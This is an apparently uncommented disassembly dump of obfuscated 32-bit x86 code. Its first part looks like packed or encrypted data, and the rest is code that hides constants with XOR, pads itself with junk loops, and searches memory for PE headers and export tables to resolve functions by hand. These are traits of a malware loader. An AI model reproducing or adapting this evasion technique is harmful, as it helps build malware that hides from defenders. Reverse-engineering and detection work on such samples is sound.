  422f4c:	push   ds
  422f4d:	in     eax,dx
  422f4e:	lds    esi,FWORD PTR [edx+esi*1-0x75]
  422f52:	jns    0x422f61
  422f54:	mov    ds:0xe96d662b,al
  422f59:	sub    eax,0xc3849bc0
  422f5e:	and    ch,BYTE PTR [edx+ebx*8-0x29]
  422f62:	mov    esp,0xc268eed5
  422f67:	vpxor  xmm7,xmm7,XMMWORD PTR [edi]
  422f6b:	push   eax
  422f6c:	sbb    ah,BYTE PTR [edi+0x789f0a00]
  422f72:	dec    edi
  422f73:	push   ds
  422f74:	test   al,0x97
  422f76:	pop    ss
  422f77:	add    DWORD PTR [edx-0xd99a880],edi
  422f7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f7e:	data16 sub al,0xf3
  422f81:	popa   
  422f82:	pop    edi
  422f83:	rcr    ebp,1
  422f85:	lea    edi,[esi+0x33761b8a]
  422f8b:	fadd   DWORD PTR ds:[esi]
  422f8e:	adc    eax,0x6ac278d7
  422f93:	cmp    DWORD PTR [eax+eiz*1],0xbf8c45af
  422f9a:	mov    DWORD PTR ds:0x9da8e5a2,ebp
  422fa0:	jle    0x423016
  422fa2:	(bad)  [eax]
  422fa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422fa5:	xchg   edi,eax
  422fa6:	sbb    edi,edx
  422fa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422fa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422faa:	pop    es
  422fab:	lds    ebx,FWORD PTR [ebp+edi*8+0x691e5fb6]
  422fb2:	xor    al,0xdd
  422fb4:	in     al,dx
  422fb5:	nop
  422fb6:	pop    es
  422fb7:	int    0x75
  422fb9:	push   eax
  422fba:	call   0x343e:0x83cee7cb
  422fc1:	enter  0x65cd,0x7a
  422fc5:	and    BYTE PTR [eax+0x60],0x40
  422fc9:	out    dx,eax
  422fca:	dec    edi
  422fcb:	(bad)
  422fce:	jmp    0x79bc:0x573f8280
  422fd5:	mov    cl,0x48
  422fd7:	push   es
  422fd8:	xor    ecx,DWORD PTR [edi]
  422fda:	or     bh,cl
  422fdc:	retf   0x91f9
  422fdf:	pop    ss
  422fe0:	dec    eax
  422fe1:	mov    al,ds:0x58852490
  422fe6:	(bad)  
  422fe7:	fldcw  WORD PTR [ebx+0x7]
  422fea:	test   eax,0xd58f6f23
  422fef:	mov    ah,0x34
  422ff1:	add    ch,dl
  422ff3:	inc    esp
  422ff4:	sub    eax,0xa98b9237
  422ff9:	xchg   esi,eax
  422ffa:	daa    
  422ffb:	pop    es
  422ffc:	int3   
  422ffd:	cld    
  422ffe:	inc    eax
  422fff:	xchg   ecx,eax
  423000:	call   0x231d:0xef283d3
  423007:	rol    DWORD PTR ds:0x6297dbfc,1
  42300d:	(bad)
  423010:	shl    bh,cl
  423012:	fisttp DWORD PTR ds:0x57266df4
  423018:	dec    ebp
  423019:	adc    esp,ebx
  42301b:	cmp    edi,esi
  42301d:	repnz nop
  42301f:	inc    esi
  423020:	test   BYTE PTR [esi+eax*8],bh
  423023:	inc    eax
  423024:	test   BYTE PTR [eax],0x3b
  423027:	jnp    0x422fd7
  423029:	call   0xac40:0x26c95ad8
  423030:	push   ebx
  423031:	sub    DWORD PTR [edi-0x64],esi
  423034:	aam    0xe1
  423036:	cmp    eax,0x11762166
  42303b:	(bad)  
  42303c:	mov    dh,0xa8
  42303e:	int    0x45
  423040:	mov    bl,0xe
  423042:	dec    ebp
  423043:	add    eax,0xe7a17032
  423048:	xor    al,0xda
  42304a:	jmp    0x4230b1
  42304c:	and    al,0x12
  42304e:	loope  0x42309a
  423050:	test   al,0x9c
  423052:	daa    
  423053:	jp     0x423001
  423055:	stos   DWORD PTR es:[edi],eax
  423056:	adc    eax,0xfa022318
  42305b:	or     DWORD PTR [esi-0xb],ebx
  42305e:	cmp    BYTE PTR [esi-0x37],cl
  423061:	aaa    
  423062:	sbb    DWORD PTR [edi],0x24
  423065:	jno    0x42305a
  423067:	cs out 0xde,al
  42306a:	fld    QWORD PTR [edx-0x5c]
  42306d:	mov    al,0xac
  42306f:	mov    bh,0x66
  423071:	mov    ebx,0x42aeba77
  423076:	arpl   WORD PTR [esi],di
  423078:	loope  0x4230da
  42307a:	or     ebp,0xffffffbe
  42307d:	lock mov WORD PTR [edi-0x79],cx
  423082:	push   ecx
  423083:	lahf   
  423084:	adc    edx,DWORD PTR [edi+0x7e1a0fad]
  42308a:	mov    ss,WORD PTR [esi-0x759fc0c]
  423090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423091:	sub    ebx,esi
  423093:	cmp    al,0x60
  423095:	fdivr  QWORD PTR ds:0x24844179
  42309b:	inc    edi
  42309c:	addr16 cdq 
  42309e:	and    al,bl
  4230a0:	xchg   edx,eax
  4230a1:	jmp    0x423122
  4230a3:	inc    edi
  4230a4:	sahf   
  4230a5:	dec    esi
  4230a6:	or     al,0xc9
  4230a8:	lods   al,BYTE PTR ds:[esi]
  4230a9:	jne    0x4230ab
  4230ab:	sbb    eax,0x7f8ad2e8
  4230b0:	je     0x42307c
  4230b2:	mov    al,ds:0x68b45e42
  4230b7:	imul   BYTE PTR [edi+0x6e4d6cbe]
  4230bd:	mov    al,0x85
  4230bf:	in     eax,0x91
  4230c1:	xchg   DWORD PTR [ebp+0x63],edx
  4230c4:	fiadd  DWORD PTR [edi-0x4]
  4230c7:	(bad)  
  4230c8:	or     al,0xa1
  4230ca:	dec    ebx
  4230cb:	pushf  
  4230cc:	push   eax
  4230cd:	add    ecx,DWORD PTR [ebp+0x159737d7]
  4230d3:	adc    eax,0x2987ca3
  4230d8:	mov    ecx,0x27437b68
  4230dd:	hlt    
  4230de:	out    0x11,al
  4230e0:	(bad)  
  4230e1:	cmp    BYTE PTR [eax+0x5c],bl
  4230e4:	test   DWORD PTR [eax],0xafdb5cb4
  4230ea:	dec    esp
  4230eb:	hlt    
  4230ec:	dec    edi
  4230ed:	hlt    
  4230ee:	adc    eax,0x6aff1ff1
  4230f3:	xor    edi,edi
  4230f5:	call   0xa122794a
  4230fa:	ret    0xa762
  4230fd:	div    BYTE PTR [edi-0x3c]
  423100:	lds    edx,FWORD PTR [ecx-0x667387c0]
  423106:	mov    bh,0x95
  423108:	cld    
  423109:	dec    esp
  42310a:	popf   
  42310b:	push   ecx
  42310c:	lahf   
  42310d:	pop    ebx
  42310e:	fld    QWORD PTR [esp+eax*8+0x1226bc9f]
  423115:	mov    al,ds:0xc8cde05
  42311a:	jge    0x423122
  42311c:	das    
  42311d:	iret   
  42311e:	sar    ebx,1
  423120:	and    al,0xc0
  423122:	jmp    0x4230ed
  423124:	call   0xea43:0x559b44fc
  42312b:	mov    WORD PTR [ebp*1+0x393260b4],?
  423132:	dec    edx
  423133:	loop   0x4230d6
  423135:	pusha  
  423136:	lds    ebx,FWORD PTR ds:0xec9d37e1
  42313c:	sbb    BYTE PTR [ebp+0x6ff27419],dl
  423142:	mov    DWORD PTR [eax],edx
  423144:	fwait
  423145:	xor    BYTE PTR [edx-0x34815f2e],bl
  42314b:	fld    DWORD PTR [edx-0x4897a377]
  423151:	mov    eax,0xac7f7c22
  423156:	sbb    esp,DWORD PTR [esi+0x756127e2]
  42315c:	add    cl,BYTE PTR [ecx]
  42315e:	std    
  42315f:	lods   eax,DWORD PTR ds:[esi]
  423160:	cmp    al,0x93
  423162:	test   eax,0xce741c6d
  423167:	and    al,0xeb
  423169:	jg     0x42315d
  42316b:	and    eax,0x577a2db6
  423170:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423171:	mov    edx,esi
  423173:	mov    edx,0x157c3ab8
  423178:	sbb    al,0xd0
  42317a:	pop    ebp
  42317b:	jmp    0x56ffa673
  423180:	imul   esp,DWORD PTR [esi+0x53eb3280],0x5d
  423187:	lea    esi,[esi+ebp*2]
  42318a:	pop    ebp
  42318b:	imul   ecx,ebp,0x6e
  42318e:	enter  0xebe0,0x4d
  423192:	and    DWORD PTR [ebx+0x2ac62764],ecx
  423198:	dec    eax
  423199:	pop    esp
  42319a:	dec    esp
  42319b:	aaa    
  42319c:	mov    dl,bl
  42319e:	push   cs
  42319f:	jmp    0x423140
  4231a1:	fcmove st,st(3)
  4231a3:	jge    0x423171
  4231a5:	imul   esi,DWORD PTR [edx-0x6ed083de],0xa3a095a0
  4231af:	mov    dh,0x4
  4231b1:	jl     0x4231c6
  4231b3:	ret    
  4231b4:	cmp    al,0x4d
  4231b6:	adc    DWORD PTR ds:0x92f0301,0x8100eff0
  4231c0:	fstp   DWORD PTR [edx]
  4231c2:	les    ebx,FWORD PTR [ecx+0x35]
  4231c5:	lods   al,BYTE PTR ds:[esi]
  4231c6:	aas    
  4231c7:	mov    edx,0xe10f0c45
  4231cc:	ss sar bl,1
  4231cf:	dec    eax
  4231d0:	xchg   ebp,eax
  4231d1:	xchg   BYTE PTR [ecx-0x52ba3ccc],bh
  4231d7:	outs   dx,BYTE PTR ds:[esi]
  4231d8:	pop    esi
  4231d9:	mov    esp,0xb5901a0b
  4231de:	cli    
  4231df:	pop    ebp
  4231e0:	xchg   esi,eax
  4231e1:	adc    al,ah
  4231e3:	daa    
  4231e4:	and    al,0x41
  4231e6:	out    dx,eax
  4231e7:	loopne 0x423197
  4231e9:	js     0x423206
  4231eb:	repnz lds ecx,FWORD PTR [ebp-0x50ceec29]
  4231f2:	jmp    0x42318c
  4231f4:	jns    0x423249
  4231f6:	fidiv  DWORD PTR [eax+0x59b53994]
  4231fc:	cld    
  4231fd:	sbb    BYTE PTR [eax-0x757593d9],dl
  423203:	icebp  
  423204:	aad    0x56
  423206:	jmp    0x63f:0x980b7b2d
  42320d:	mov    es,WORD PTR [ebx+0x29a4c343]
  423213:	mov    ch,0xaf
  423215:	pop    ds
  423216:	pop    eax
  423217:	fdiv   QWORD PTR [edi-0xf2b11c9]
  42321d:	fimul  DWORD PTR [esi]
  42321f:	lods   al,BYTE PTR ds:[esi]
  423220:	and    al,0x63
  423222:	add    eax,0x44787548
  423227:	mov    al,0xa5
  423229:	mov    dh,0x42
  42322b:	ins    DWORD PTR es:[edi],dx
  42322c:	mov    al,gs:0xa510a275
  423232:	shl    DWORD PTR [esi],0x6a
  423235:	sahf   
  423236:	pop    ss
  423237:	inc    ecx
  423238:	pop    edx
  423239:	das    
  42323a:	xchg   DWORD PTR [edx],ecx
  42323c:	jle    0x423210
  42323e:	dec    edx
  42323f:	dec    esp
  423240:	int3   
  423241:	mov    esp,0x3a02522a
  423246:	retf   
  423247:	xchg   edi,eax
  423248:	(bad)  
  423249:	test   al,0x97
  42324b:	jl     0x423277
  42324d:	xlat   BYTE PTR ds:[ebx]
  42324e:	xor    eax,0x32c4b9fd
  423253:	xor    DWORD PTR [eax-0x28],ebx
  423256:	fistp  QWORD PTR [ebp+0xa]
  423259:	jmp    0xf21ae63
  42325e:	xchg   ebx,eax
  42325f:	retf   
  423260:	jb     0x42328b
  423262:	jo     0x423247
  423264:	loop   0x42327e
  423266:	adc    DWORD PTR [edx],eax
  423268:	out    dx,eax
  423269:	out    0x43,al
  42326b:	test   BYTE PTR [edx-0x72],ch
  42326e:	mov    al,0xe0
  423270:	pop    ebx
  423271:	dec    esi
  423272:	mov    cl,0x22
  423274:	add    al,0xa7
  423276:	and    dl,BYTE PTR [ebx-0x1ce7aff6]
  42327c:	sub    cl,bl
  42327e:	sub    eax,DWORD PTR [edi+0x7a]
  423281:	test   DWORD PTR [ebx+ecx*4-0x2c08f7bb],eax
  423288:	mov    edi,DWORD PTR [ebp+0xc]
  42328b:	movzx  ebx,WORD PTR ds:0x4267f4
  423292:	mov    DWORD PTR [ebp-0x34],edi
  423295:	mov    edi,DWORD PTR [ebp+0x10]
  423298:	mov    ebx,DWORD PTR [ebp+0x14]
  42329b:	mov    DWORD PTR ds:0x426800,0x2ace
  4232a5:	cmp    eax,edi
  4232a7:	jne    0x4232b6
  4232ad:	cmp    DWORD PTR [ebp-0x34],ebx
  4232b0:	je     0x42350b
  4232b6:	mov    eax,DWORD PTR [ebp+0x18]
  4232b9:	xor    eax,ecx
  4232bb:	or     DWORD PTR ds:0x426810,ebx
  4232c1:	add    eax,0x376272fb
  4232c6:	mov    DWORD PTR [ebp-0x20],eax
  4232c9:	mov    eax,DWORD PTR [ebp+0x10]
  4232cc:	mov    edi,DWORD PTR [ebp+0x14]
  4232cf:	or     DWORD PTR ds:0x4267d4,ecx
  4232d5:	mov    edi,DWORD PTR [ebp-0xc]
  4232d8:	sbb    ebx,0xf76
  4232de:	xor    eax,edx
  4232e0:	xor    DWORD PTR ds:0x4267c4,0x7a43
  4232ea:	add    eax,esi
  4232ec:	imul   eax,DWORD PTR [edi]
  4232ef:	mov    edi,DWORD PTR [ebp+0x8]
  4232f2:	and    DWORD PTR ds:0x42685c,0x0
  4232fc:	jmp    0x42330e
  423301:	mov    ebx,DWORD PTR ds:0x42685c
  423307:	inc    ebx
  423308:	mov    DWORD PTR ds:0x42685c,ebx
  42330e:	cmp    DWORD PTR ds:0x42685c,0x1d
  423315:	jae    0x423343
  42331b:	cmp    DWORD PTR ds:0x42685c,0x26
  423322:	jge    0x423343
  423328:	jmp    0x42333e
  42332d:	push   DWORD PTR [ebp-0x28]
  423330:	push   0x8d74
  423335:	push   DWORD PTR [ebp-0x18]
  423338:	call   DWORD PTR ds:0x4257a0
  42333e:	jmp    0x423301
  423343:	mov    ebx,DWORD PTR [ebp+0xc]
  423346:	xor    edi,edx
  423348:	not    DWORD PTR ds:0x426858
  42334e:	add    edi,esi
  423350:	mov    DWORD PTR ds:0x4267c0,0x7af6
  42335a:	cmp    edi,eax
  42335c:	mov    eax,DWORD PTR [ebp-0x4]
  42335f:	je     0x42339b
  423365:	mov    edi,DWORD PTR [ebp-0x20]
  423368:	add    DWORD PTR [eax],edi
  42336a:	or     DWORD PTR ds:0x42680c,edi
  423370:	mov    eax,DWORD PTR [ebp-0x4]
  423373:	mov    edi,DWORD PTR [ebp+0x10]
  423376:	mov    ebx,DWORD PTR [ebp+0x14]
  423379:	xor    edi,edx
  42337b:	add    edi,esi
  42337d:	sbb    DWORD PTR ds:0x4267e4,0x426848
  423387:	imul   edi,DWORD PTR [eax]
  42338a:	mov    DWORD PTR ds:0x426854,0x15f1
  423394:	mov    DWORD PTR [eax],edi
  423396:	jmp    0x4233ac
  42339b:	adc    edi,DWORD PTR ds:0x426808
  4233a1:	mov    edi,DWORD PTR [ebp+0x1c]
  4233a4:	sbb    DWORD PTR ds:0x426840,edx
  4233aa:	xor    DWORD PTR [eax],edi
  4233ac:	mov    eax,DWORD PTR [ebp-0x4]
  4233af:	mov    edi,DWORD PTR [ebp+0x18]
  4233b2:	xor    edi,ecx
  4233b4:	mov    ebx,0xc89d8d05
  4233b9:	sub    ebx,edi
  4233bb:	add    DWORD PTR [eax],ebx
  4233bd:	mov    eax,DWORD PTR [ebp-0x4]
  4233c0:	mov    edi,DWORD PTR [ebp-0xc]
  4233c3:	add    edi,DWORD PTR [eax]
  4233c5:	mov    DWORD PTR [ebp-0xc],edi
  4233c8:	mov    eax,DWORD PTR [ebp+0x10]
  4233cb:	mov    edi,DWORD PTR [ebp+0x14]
  4233ce:	mov    edi,DWORD PTR [ebp+0x10]
  4233d1:	mov    ebx,DWORD PTR [ebp+0x14]
  4233d4:	xor    edi,edx
  4233d6:	xor    eax,edx
  4233d8:	lea    eax,[eax+edi*1-0x537b7d92]
  4233df:	mov    edi,DWORD PTR [ebp+0x10]
  4233e2:	mov    ebx,DWORD PTR [ebp+0x14]
  4233e5:	xor    edi,edx
  4233e7:	add    edi,esi
  4233e9:	imul   eax,edi
  4233ec:	mov    edi,DWORD PTR [ebp+0x10]
  4233ef:	mov    ebx,DWORD PTR [ebp+0x14]
  4233f2:	xor    edi,edx
  4233f4:	sub    edi,eax
  4233f6:	mov    eax,DWORD PTR [ebp-0x4]
  4233f9:	add    edi,esi
  4233fb:	cmp    DWORD PTR [eax],edi
  4233fd:	mov    eax,DWORD PTR [ebp-0x4]
  423400:	mov    edi,DWORD PTR [ebp+0x18]
  423403:	jg     0x423419
  423409:	xor    edi,ecx
  42340b:	mov    ebx,0xc89d8d05
  423410:	sub    ebx,edi
  423412:	add    DWORD PTR [eax],ebx
  423414:	jmp    0x423423
  423419:	xor    edi,ecx
  42341b:	add    edi,0x376272fb
  423421:	add    DWORD PTR [eax],edi
  423423:	mov    eax,DWORD PTR [ebp-0xc]
  423426:	mov    edi,DWORD PTR [ebp-0x10]
  423429:	mov    eax,DWORD PTR [eax]
  42342b:	xor    edi,ecx
  42342d:	add    edi,0x376272fa
  423433:	not    edi
  423435:	and    eax,edi
  423437:	jmp    0x42344a
  42343c:	mov    edi,DWORD PTR [ebp-0x10]
  42343f:	xor    edi,ecx
  423441:	mov    ebx,0xc89d8d05
  423446:	sub    ebx,edi
  423448:	add    eax,ebx
  42344a:	mov    DWORD PTR [ebp-0x28],0xce97b85d
  423451:	mov    edi,0xffff2df0
  423456:	mov    DWORD PTR [ebp-0x24],edi
  423459:	mov    DWORD PTR [ebp-0x30],0xce97a55f
  423460:	mov    DWORD PTR [ebp-0x2c],edi
  423463:	mov    edi,DWORD PTR [ebp-0x28]
  423466:	mov    ebx,DWORD PTR [ebp-0x24]
  423469:	mov    ebx,0xa14b
  42346e:	xor    di,bx
  423471:	mov    ebx,0x4137
  423476:	add    di,bx
  423479:	cmp    WORD PTR [eax],di
  42347c:	jne    0x42343c
  423482:	mov    ecx,DWORD PTR [ebp-0x14]
  423485:	mov    ecx,DWORD PTR [ecx]
  423487:	mov    edi,DWORD PTR [eax+0x3c]
  42348a:	lea    ecx,[edi+ecx*8+0x78]
  42348e:	mov    ecx,DWORD PTR [ecx+eax*1]
  423491:	mov    DWORD PTR [ebp-0x18],ecx
  423494:	mov    ecx,DWORD PTR [ebp+0x8]
  423497:	mov    edi,DWORD PTR [ebp+0xc]
  42349a:	xor    ecx,edx
  42349c:	add    ecx,esi
  42349e:	mov    DWORD PTR [ebp-0x1c],ecx
  4234a1:	mov    ecx,DWORD PTR [ebp+0x8]
  4234a4:	mov    edi,DWORD PTR [ebp+0xc]
  4234a7:	xor    ecx,edx
  4234a9:	mov    edx,DWORD PTR [ebp-0x18]
  4234ac:	add    ecx,esi
  4234ae:	cmp    edx,ecx
  4234b0:	je     0x4234f4
  4234b6:	mov    ecx,DWORD PTR [ebp-0x18]
  4234b9:	add    ecx,eax
  4234bb:	mov    DWORD PTR [ebp-0x1c],ecx
  4234be:	mov    ecx,DWORD PTR [ebp-0x30]
  4234c1:	mov    edx,DWORD PTR [ebp-0x2c]
  4234c4:	mov    edx,0xa14b
  4234c9:	xor    cx,dx
  4234cc:	mov    edx,ebx
  4234ce:	add    cx,dx
  4234d1:	mov    edx,DWORD PTR [ebp-0x1c]
  4234d4:	mov    edx,DWORD PTR [edx+0xc]
  4234d7:	cmp    WORD PTR [eax+edx*1],cx
  4234db:	jne    0x4234f4
  4234e1:	mov    ecx,DWORD PTR ds:0x426448
  4234e7:	mov    ecx,DWORD PTR [ecx+0x198]
  4234ed:	mov    DWORD PTR [ecx],eax
  4234ef:	jmp    0x42350b
  4234f4:	push   DWORD PTR [ebp+0x1c]
  4234f7:	push   DWORD PTR [ebp+0x18]
  4234fa:	push   DWORD PTR [ebp+0x14]
  4234fd:	push   DWORD PTR [ebp+0x10]
  423500:	push   DWORD PTR [ebp+0xc]
  423503:	push   DWORD PTR [ebp+0x8]
  423506:	call   0x41f3fa
  42350b:	pop    edi
  42350c:	pop    esi
  42350d:	pop    ebx
  42350e:	leave  
  42350f:	ret    0x18
  423512:	push   ebp
  423513:	mov    ebp,esp
  423515:	and    esp,0xfffffff8
  423518:	sub    esp,0x64
  42351b:	push   ebx
  42351c:	add    DWORD PTR ds:0x4267c4,0x4267f0
  423526:	push   esi
  423527:	and    DWORD PTR ds:0x4267f8,0x6997
  423531:	push   edi
  423532:	or     DWORD PTR ds:0x4267c0,0x4267d0
  42353c:	xor    eax,eax
  42353e:	add    DWORD PTR ds:0x4267e0,0x76e2
  423548:	push   eax
  423549:	push   eax
  42354a:	push   0x3
  42354c:	add    DWORD PTR ds:0x426838,0x4267fc
  423556:	push   eax
  423557:	or     DWORD PTR ds:0x4267f0,0x77c8
  423561:	push   eax
  423562:	add    DWORD PTR ds:0x426828,0x4e0f
  42356c:	push   0x80000000
  423571:	or     DWORD PTR ds:0x4267b0,0x426848
  42357b:	push   0x42656c
  423580:	call   DWORD PTR ds:0x4257d4
  423586:	mov    DWORD PTR ds:0x426824,0x7ccb
  423590:	cmp    eax,0xffffffff
  423593:	mov    DWORD PTR ds:0x426828,0x5882
  42359d:	je     0x4235be
  4235a3:	and    DWORD PTR ds:0x4267c0,0x503a
  4235ad:	xor    eax,eax
  4235af:	mov    DWORD PTR ds:0x426850,0x4d8d
  4235b9:	jmp    0x423fbd
  4235be:	sub    DWORD PTR ds:0x42681c,0x40a5
  4235c8:	push   0x87698176
  4235cd:	call   DWORD PTR ds:0x4257d0
  4235d3:	add    DWORD PTR ds:0x4267e8,0x4267cc
  4235dd:	test   eax,eax
  4235df:	mov    DWORD PTR ds:0x4267d8,0x1e67
  4235e9:	jne    0x4235a3
  4235ef:	xor    DWORD PTR ds:0x4267d4,0x7fc9
  4235f9:	push   0x98787665
  4235fe:	call   DWORD PTR ds:0x4257dc
  423604:	adc    DWORD PTR ds:0x42685c,0x7e2e
  42360e:	test   eax,eax
  423610:	mov    DWORD PTR ds:0x4267c8,0x10ae
  42361a:	jne    0x4235a3
  423620:	mov    DWORD PTR [esp+0x50],0xce941f82
  423628:	mov    edi,0xffff2df0
  42362d:	or     ecx,ebx
  42362f:	mov    DWORD PTR [esp+0x54],edi
  423633:	xor    ecx,ecx
  423635:	mov    DWORD PTR [esp+0x48],0xce941f81
  42363d:	mov    DWORD PTR [esp+0x4c],edi
  423641:	and    DWORD PTR ds:0x4267c4,edx
  423647:	lea    eax,[esp+0x28]
  42364b:	mov    DWORD PTR [esp+0x24],eax
  42364f:	movzx  ecx,WORD PTR ds:0x4267fc
  423656:	xor    DWORD PTR ds:0x42680c,ecx
  42365c:	lea    eax,[esp+0x2c]
  423660:	mov    DWORD PTR ds:0x426800,0x13
  42366a:	cmp    DWORD PTR ds:0x426800,0x0
  423671:	je     0x4236a6
  423677:	cmp    DWORD PTR ds:0x426800,0x22
  42367e:	ja     0x4236a6
  423684:	jmp    0x423694
  423689:	push   0x7b54
  42368e:	call   DWORD PTR ds:0x4257b8
  423694:	mov    ecx,DWORD PTR ds:0x426800
  42369a:	dec    ecx
  42369b:	mov    DWORD PTR ds:0x426800,ecx
  4236a1:	jmp    0x42366a
  4236a6:	mov    DWORD PTR [esp+0x10],eax
  4236aa:	mov    eax,ds:0x426448
  4236af:	mov    eax,DWORD PTR [eax+0x1c8]
  4236b5:	mov    eax,DWORD PTR [eax]
  4236b7:	add    ebx,0x182f
  4236bd:	mov    ecx,DWORD PTR [esp+0x10]
  4236c1:	sbb    DWORD PTR ds:0x426820,edi
  4236c7:	xor    eax,0x751018b5
  4236cc:	mov    ebx,0x376272fb
  4236d1:	add    eax,ebx
  4236d3:	mov    DWORD PTR [ecx],eax
  4236d5:	mov    eax,0x657e
  4236da:	mov    eax,ds:0x426664
  4236df:	mov    esi,0x6729a14b
  4236e4:	cmp    eax,0x466efefc
  4236e9:	jne    0x4238c6
  4236ef:	sbb    DWORD PTR ds:0x42684c,ecx
  4236f5:	mov    eax,DWORD PTR [esp+0x50]
  4236f9:	neg    ecx
  4236fb:	mov    ecx,DWORD PTR [esp+0x54]
  4236ff:	and    DWORD PTR ds:0x426844,0x0
  423709:	jmp    0x42371d
  42370e:	xor    ecx,ecx
  423710:	or     ecx,DWORD PTR ds:0x426844
  423716:	inc    ecx
  423717:	mov    DWORD PTR ds:0x426844,ecx
  42371d:	cmp    DWORD PTR ds:0x426844,0x1e
  423724:	jae    0x423766
  42372a:	cmp    DWORD PTR ds:0x426844,0x9
  423731:	jl     0x423766
  423737:	jmp    0x423747
  42373c:	push   0x4260a0
  423741:	call   DWORD PTR ds:0x4257bc
  423747:	cmp    DWORD PTR ds:0x426844,0x8
  42374e:	jne    0x423761
  423754:	mov    ecx,DWORD PTR ds:0x426844
  42375a:	inc    ecx
  42375b:	mov    DWORD PTR ds:0x426844,ecx
  423761:	jmp    0x42370e
  423766:	mov    edx,DWORD PTR ds:0x426448
  42376c:	mov    edx,DWORD PTR [edx+0x198]
  423772:	and    DWORD PTR ds:0x426818,0x0
  42377c:	jmp    0x42378e
  423781:	mov    ecx,DWORD PTR ds:0x426818
  423787:	inc    ecx
  423788:	mov    DWORD PTR ds:0x426818,ecx
  42378e:	cmp    DWORD PTR ds:0x426818,0x1e
  423795:	jae    0x4237c0
  42379b:	cmp    DWORD PTR ds:0x426818,0x26
  4237a2:	jl     0x4237c0
  4237a8:	jmp    0x4237bb
  4237ad:	push   DWORD PTR [ebp-0x20]
  4237b0:	push   0x4267b0
  4237b5:	call   DWORD PTR ds:0x4257c0
  4237bb:	jmp    0x423781
  4237c0:	xor    eax,esi
  4237c2:	not    DWORD PTR ds:0x426804
  4237c8:	mov    ecx,0x56424137
  4237cd:	sub    DWORD PTR ds:0x426848,0x4647
  4237d7:	add    eax,ecx
  4237d9:	xor    DWORD PTR ds:0x426824,0x426858
  4237e3:	mov    DWORD PTR [edx],eax
  4237e5:	sub    edx,DWORD PTR ds:0x4267e8
  4237eb:	mov    eax,DWORD PTR [esp+0x50]
  4237ef:	mov    edx,DWORD PTR ds:0x426874
  4237f5:	mov    edx,DWORD PTR [edx]
  4237f7:	xor    DWORD PTR ds:0x426828,edx
  4237fd:	mov    edx,DWORD PTR [esp+0x54]
  423801:	and    DWORD PTR ds:0x4267ec,0x0
  42380b:	mov    edx,DWORD PTR ds:0x4267ec
  423811:	inc    edx
  423812:	mov    DWORD PTR ds:0x4267ec,edx
  423818:	cmp    DWORD PTR ds:0x4267ec,0xd
  42381f:	jl     0x423863
  423825:	jmp    0x42383a
  42382a:	push   0x426840
  42382f:	push   0x4261bc
  423834:	call   DWORD PTR ds:0x4257c4
  42383a:	cmp    DWORD PTR ds:0x4267ec,0xc
  423841:	jne    0x423856
  423847:	xor    edx,edx
  423849:	or     edx,DWORD PTR ds:0x4267ec
  42384f:	inc    edx
  423850:	mov    DWORD PTR ds:0x4267ec,edx
  423856:	cmp    DWORD PTR ds:0x4267ec,0x1a
  42385d:	jb     0x42380b
  423863:	xor    eax,esi
  423865:	adc    DWORD PTR ds:0x426820,ecx
  42386b:	add    eax,ecx
  42386d:	and    DWORD PTR ds:0x42684c,ecx
  423873:	mov    ds:0x426664,eax
  423878:	mov    eax,ds:0x4268a0
  42387d:	mov    eax,DWORD PTR [eax]
  42387f:	and    DWORD PTR ds:0x4267d8,eax
  423885:	mov    eax,DWORD PTR [esp+0x50]
  423889:	movzx  edx,WORD PTR ds:0x426810
  423890:	or     DWORD PTR ds:0x4267c0,edx
  423896:	mov    edx,DWORD PTR [esp+0x54]
  42389a:	and    DWORD PTR ds:0x4267fc,0x42682c
  4238a4:	xor    eax,esi
  4238a6:	mov    DWORD PTR ds:0x4267b8,0x70e0
  4238b0:	add    eax,ecx
  4238b2:	mov    DWORD PTR ds:0x4267b0,0x5b58
  4238bc:	mov    ds:0x426540,eax
  4238c1:	jmp    0x4238d1
  4238c6:	sbb    ecx,0x186e
  4238cc:	mov    ecx,0x56424137
  4238d1:	add    DWORD PTR ds:0x426858,ebx
  4238d7:	mov    eax,ds:0x426448
  4238dc:	add    DWORD PTR ds:0x426824,ebx
  4238e2:	mov    eax,DWORD PTR [eax+0x18c]
  4238e8:	and    DWORD PTR ds:0x4267e4,0x0
  4238f2:	mov    edx,DWORD PTR ds:0x4267e4
  4238f8:	inc    edx
  4238f9:	mov    DWORD PTR ds:0x4267e4,edx
  4238ff:	cmp    DWORD PTR ds:0x4267e4,0x19
  423906:	jge    0x423929
  42390c:	jmp    0x42391c
  423911:	push   0x426840
  423916:	call   DWORD PTR ds:0x4257c8
  42391c:	cmp    DWORD PTR ds:0x4267e4,0x17
  423923:	jb     0x4238f2
  423929:	mov    eax,DWORD PTR [eax]
  42392b:	and    DWORD PTR ds:0x4267e4,0x0
  423935:	jmp    0x423949
  42393a:	xor    edx,edx
  42393c:	xor    edx,DWORD PTR ds:0x4267e4
  423942:	inc    edx
  423943:	mov    DWORD PTR ds:0x4267e4,edx
  423949:	cmp    DWORD PTR ds:0x4267e4,0x13
  423950:	jae    0x42399c
  423956:	cmp    DWORD PTR ds:0x4267e4,0xb
  42395d:	jg     0x42399c
  423963:	jmp    0x42397d
  423968:	push   0x7bac
  42396d:	push   0x4267e0
  423972:	push   0x42600f
  423977:	call   DWORD PTR ds:0x4257cc
  42397d:	cmp    DWORD PTR ds:0x4267e4,0xa
  423984:	jne    0x423997
  42398a:	mov    edx,DWORD PTR ds:0x4267e4
  423990:	inc    edx
  423991:	mov    DWORD PTR ds:0x4267e4,edx
  423997:	jmp    0x42393a
  42399c:	mov    DWORD PTR [esp+0x30],eax
  4239a0:	mov    eax,0xce941f86
  4239a5:	and    DWORD PTR ds:0x426848,0x0
  4239af:	mov    edx,DWORD PTR ds:0x426848
  4239b5:	inc    edx
  4239b6:	mov    DWORD PTR ds:0x426848,edx
  4239bc:	cmp    DWORD PTR ds:0x426848,0xa
  4239c3:	jl     0x423a16
  4239c9:	jmp    0x4239ef
  4239ce:	push   DWORD PTR [ebp-0x28]
  4239d1:	push   DWORD PTR [ebp-0x14]
  4239d4:	push   0x6451
  4239d9:	push   DWORD PTR [ebp-0x10]
  4239dc:	push   DWORD PTR [ebp-0xc]
  4239df:	push   0x1318
  4239e4:	push   0x4260c9
